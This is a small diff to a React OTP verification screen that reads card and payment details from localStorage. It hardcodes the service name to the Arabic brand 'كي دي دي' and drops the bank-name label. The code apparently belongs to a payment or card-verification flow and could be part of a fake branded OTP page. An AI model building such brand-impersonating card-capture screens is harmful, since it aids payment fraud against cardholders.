@@ -25,7 +25,7 @@ export default function OTPVerification() {
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
   const cardLast4 = paymentData.cardLast4 || "****";
   const totalAmount = paymentData.totalPaid || 0;
-  const serviceName = paymentData.serviceName || "";
+  const serviceName = "كي دي دي";
   
   // Get card info from localStorage (fallback) or signal
   const signalCardInfo = waitingCardInfo.value;
@@ -172,7 +172,6 @@ export default function OTPVerification() {
                   onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                 />
               )}
-              <span className="font-bold text-gray-700 text-base">{cardInfo.bankName}</span>
             </div>
           )}
         </div>
